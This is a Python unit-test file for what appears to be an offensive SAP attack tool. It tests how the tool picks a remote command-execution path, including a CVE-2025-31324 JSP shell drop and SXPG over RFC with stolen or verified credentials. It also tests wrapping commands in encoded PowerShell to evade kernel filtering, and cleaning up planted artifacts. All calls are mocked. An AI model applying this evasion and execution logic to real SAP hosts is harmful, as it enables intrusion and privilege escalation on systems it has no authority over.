#!/usr/bin/env python3
"""Tests for the SXPG-via-RFC fallback primitive in Windows LPE."""

import sys
import os
import pytest
from unittest.mock import patch, MagicMock

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from sapmap_models import SAPNode, Credentials


class TestRobustPreCleanup:
    """The per-path cleanup helper must delete each artifact and verify."""

    def test_clean_path_only_runs_del_and_probe(self):
        """When the artifact is already gone, no Remove-Item fallback runs."""
        from sapmap_miniplasma import _robust_pre_cleanup
        calls = []
        def fake_gw(prog, args, lp=""):
            calls.append((prog, args))
            if "if exist" in args:
                return ("GONE\n", True)
            return ("", True)
        ok = _robust_pre_cleanup(
            fake_gw, "TST", [r"C:\Windows\Temp\foo.txt"],
            technique="Test")
        assert ok is True
        # First call: del, second: probe. No PS fallback.
        assert len(calls) == 2
        assert calls[0][1].startswith("/C del")
        assert "/C if exist" in calls[1][1]

    def test_stuck_path_triggers_powershell_fallback(self):
        """If cmd del fails to remove the file, fallback to Remove-Item."""
        from sapmap_miniplasma import _robust_pre_cleanup
        calls = []
        # First probe says STILL (cmd del failed); after PS removal,
        # second probe says GONE.
        probe_results = iter(["STILL\n", "GONE\n"])
        def fake_gw(prog, args, lp=""):
            calls.append((prog, args))
            if "if exist" in args:
                return (next(probe_results), True)
            return ("", True)
        ok = _robust_pre_cleanup(
            fake_gw, "TST", [r"C:\Windows\Temp\foo.txt"],
            technique="Test")
        assert ok is True
        # Sequence: del, probe(STILL), powershell remove, probe(GONE)
        assert len(calls) == 4
        assert calls[2][0] == "powershell.exe"
        assert "Remove-Item" in calls[2][1]

    def test_all_attempts_fail_returns_false(self):
        from sapmap_miniplasma import _robust_pre_cleanup
        def fake_gw(prog, args, lp=""):
            if "if exist" in args:
                return ("STILL\n", True)
            return ("", True)
        ok = _robust_pre_cleanup(
            fake_gw, "TST", [r"C:\Windows\Temp\stuck.txt"],
            technique="Test")
        assert ok is False

    def test_multiple_paths_each_handled_independently(self):
        from sapmap_miniplasma import _robust_pre_cleanup
        seen_paths = []
        def fake_gw(prog, args, lp=""):
            if "/C del" in args:
                # Extract the quoted path from the args
                import re
                m = re.search(r'"([^"]+)"', args)
                if m:
                    seen_paths.append(m.group(1))
            if "if exist" in args:
                return ("GONE\n", True)
            return ("", True)
        paths = [r"C:\Windows\Temp\a.txt",
                 r"C:\Windows\Temp\b.exe",
                 r"C:\Windows\Temp\c.bat"]
        _robust_pre_cleanup(fake_gw, "TST", paths, technique="Test")
        assert seen_paths == paths


class TestMakeExecSXPGFallback:

    def _make_node(self, sid="TWT", gw_vuln=False, cve_vuln=False,
                   cve_port=0, creds=None):
        node = SAPNode(sid=sid, hostname=f"{sid.lower()}.local",
                       ip="10.0.0.1")
        node.gw_vulnerable = gw_vuln
        node.cve_2025_31324_vulnerable = cve_vuln
        node.cve_2025_31324_port = cve_port
        if creds:
            node.credentials.extend(creds)
        return node

    def test_no_primitive_when_no_creds_no_exploits(self):
        from sapmap_miniplasma import _make_exec
        node = self._make_node()
        exec_fn, chunk, label = _make_exec(node, "TWT", verbose=False)
        assert exec_fn is None
        assert label == ""

    def test_sxpg_selected_when_only_verified_creds(self):
        """No GW vuln, no CVE shell, but a verified RFC cred → SXPG."""
        from sapmap_miniplasma import _make_exec
        cred = Credentials(
            username="SAPMAP00", password="Andinyougo123!",
            client="001", instance_nr="00", verified=True,
        )
        node = self._make_node(creds=[cred])
        exec_fn, chunk, label = _make_exec(node, "TWT", verbose=False)
        assert exec_fn is not None
        assert label == "sxpg_rfc"
        # Chunk size 2000: cmd.exe echo+redirect gets rewritten to
        # PowerShell -EncodedCommand at call time, so the param body
        # is opaque base64 and survives LONG_PARAMS kernel filtering.
        assert chunk == 2000

    def test_gw_preferred_over_sxpg(self):
        """Gateway SAPXPG is preferred over SXPG when both available."""
        from sapmap_miniplasma import _make_exec
        cred = Credentials(
            username="SAPMAP00", password="x",
            client="001", instance_nr="00", verified=True,
        )
        node = self._make_node(gw_vuln=True, creds=[cred])
        exec_fn, chunk, label = _make_exec(node, "TWT", verbose=False)
        assert label == "gw_sapxpg"

    def test_jsp_shell_preferred_over_sxpg(self):
        """CVE-2025-31324 JSP shell is preferred over SXPG."""
        from sapmap_miniplasma import _make_exec
        cred = Credentials(
            username="SAPMAP00", password="x",
            client="001", instance_nr="00", verified=True,
        )
        node = self._make_node(cve_vuln=True, cve_port=50000,
                                 creds=[cred])
        # JSP shell drop will be attempted — skip that path by
        # mocking the import inside _make_exec.  We just verify
        # the priority logic by ensuring SXPG isn't picked.
        with patch("sapmap_exploit.drop_cve_2025_31324_shell",
                    return_value={"success": False,
                                  "error": "mocked"}):
            # JSP drop fails → falls through to SXPG (since no gw)
            exec_fn, chunk, label = _make_exec(node, "TWT",
                                                 verbose=False)
            # Either jsp_shell (if shells already there) or sxpg_rfc
            # (if JSP drop failed). Both are valid; ensure no crash.
            assert label in ("jsp_shell", "sxpg_rfc")

    def test_sxpg_exec_fn_calls_execute_local_command(self):
        """The SXPG exec_fn must route through execute_local_command."""
        from sapmap_miniplasma import _make_exec
        cred = Credentials(
            username="SAPMAP00", password="Andinyougo123!",
            client="001", instance_nr="00", verified=True,
        )
        node = self._make_node(creds=[cred])
        exec_fn, _, _ = _make_exec(node, "TWT", verbose=False)
        assert exec_fn is not None

        with patch("sapmap_rfc.execute_local_command") as mock_exec:
            mock_exec.return_value = {
                "success": True,
                "output": ["line1", "line2"],
                "error": "",
            }
            out, ok = exec_fn("cmd.exe", "/C ver", "")
            assert ok is True
            assert out == "line1\nline2"
            mock_exec.assert_called_once()
            # Verify creds were passed through
            call_args = mock_exec.call_args
            assert call_args[0][3] is cred

    def test_sxpg_buffers_cmd_echo_appends(self):
        """cmd.exe echo X>>"path" should be BUFFERED, not immediately
        shipped — the chunks accumulate and only flush via blob-stage
        when the next non-echo command arrives."""
        from sapmap_miniplasma import _make_exec
        cred = Credentials(
            username="SAPMAP00", password="x",
            client="001", instance_nr="00", verified=True,
        )
        node = self._make_node(creds=[cred])
        exec_fn, _, _ = _make_exec(node, "TWT", verbose=False)
        assert exec_fn is not None

        call_count = {"n": 0}
        def fake_exec(node_arg, prog, params, creds_arg):
            call_count["n"] += 1
            return {"success": True, "output": [], "error": ""}

        # Series of chunk writes -- should buffer, not invoke SXPG
        with patch("sapmap_rfc.execute_local_command",
                    side_effect=fake_exec):
            exec_fn("cmd.exe",
                    '/C echo SGVsbG8=>"C:\\Windows\\Temp\\f.b64"', "")
            exec_fn("cmd.exe",
                    '/C echo V29ybGQ=>>"C:\\Windows\\Temp\\f.b64"', "")
        # No execute_local_command call should have happened yet
        assert call_count["n"] == 0

    def test_sxpg_wraps_non_echo_via_powershell_cmd_c(self):
        """Non-echo cmd.exe calls go through PowerShell with the
        original cmd line preserved via & cmd /c '...'."""
        from sapmap_miniplasma import _make_exec
        cred = Credentials(
            username="SAPMAP00", password="x",
            client="001", instance_nr="00", verified=True,
        )
        node = self._make_node(creds=[cred])
        exec_fn, _, _ = _make_exec(node, "TWT", verbose=False)
        captured = {}
        def fake_exec(node_arg, prog, params, creds_arg):
            captured["prog"] = prog
            captured["params"] = params
            return {"success": True, "output": [], "error": ""}
        with patch("sapmap_rfc.execute_local_command",
                    side_effect=fake_exec):
            exec_fn("cmd.exe",
                    '/C dir "C:\\Windows\\Temp\\f.b64"', "")
        assert captured["prog"] == "powershell.exe"
        assert "-EncodedCommand" in captured["params"]
        import base64
        b64 = captured["params"].split("-EncodedCommand ")[-1]
        decoded = base64.b64decode(b64).decode("utf-16-le")
        assert "cmd /c" in decoded
        assert 'dir "C:\\Windows\\Temp\\f.b64"' in decoded

    def test_sxpg_wraps_non_echo_cmd_in_powershell_cmd_c(self):
        """Non-echo cmd.exe calls wrap inner command via PowerShell
        & cmd /c '<inner>' to defeat SXPG kernel filtering."""
        from sapmap_miniplasma import _make_exec
        cred = Credentials(
            username="SAPMAP00", password="x",
            client="001", instance_nr="00", verified=True,
        )
        node = self._make_node(creds=[cred])
        exec_fn, _, _ = _make_exec(node, "TWT", verbose=False)
        captured = {}
        def fake_exec(node_arg, prog, params, creds_arg):
            captured["prog"] = prog
            captured["params"] = params
            return {"success": True, "output": ["x"], "error": ""}
        with patch("sapmap_rfc.execute_local_command",
                    side_effect=fake_exec):
            exec_fn("cmd.exe", "/C ver", "")
        assert captured["prog"] == "powershell.exe"
        assert "-EncodedCommand" in captured["params"]
        import base64, re
        m = re.search(r"-EncodedCommand\s+(\S+)", captured["params"])
        decoded = base64.b64decode(m.group(1)).decode("utf-16-le")
        assert "cmd /c 'ver'" in decoded

    def test_sxpg_non_cmd_program_passes_through(self):
        """Non-cmd programs (e.g. operator passes powershell.exe
        directly) should NOT be rewritten."""
        from sapmap_miniplasma import _make_exec
        cred = Credentials(
            username="SAPMAP00", password="x",
            client="001", instance_nr="00", verified=True,
        )
        node = self._make_node(creds=[cred])
        exec_fn, _, _ = _make_exec(node, "TWT", verbose=False)
        captured = {}
        def fake_exec(node_arg, prog, params, creds_arg):
            captured["prog"] = prog
            captured["params"] = params
            return {"success": True, "output": [], "error": ""}
        with patch("sapmap_rfc.execute_local_command",
                    side_effect=fake_exec):
            exec_fn("whoami.exe", "/priv", "")
        assert captured["prog"] == "whoami.exe"
        assert captured["params"] == "/priv"

    def test_sxpg_uses_first_verified_cred(self):
        """When multiple creds present, picks first verified one."""
        from sapmap_miniplasma import _make_exec
        cred_unverified = Credentials(
            username="OPERATOR", password="weak",
            client="001", instance_nr="00", verified=False,
        )
        cred_verified = Credentials(
            username="SAPMAP00", password="Andinyougo123!",
            client="001", instance_nr="00", verified=True,
        )
        node = self._make_node(
            creds=[cred_unverified, cred_verified])
        exec_fn, _, label = _make_exec(node, "TWT", verbose=False)
        assert label == "sxpg_rfc"

        with patch("sapmap_rfc.execute_local_command") as mock_exec:
            mock_exec.return_value = {"success": True, "output": [],
                                      "error": ""}
            exec_fn("cmd.exe", "/C ver", "")
            call_args = mock_exec.call_args
            # The cred passed should be the verified one
            assert call_args[0][3].username == "SAPMAP00"
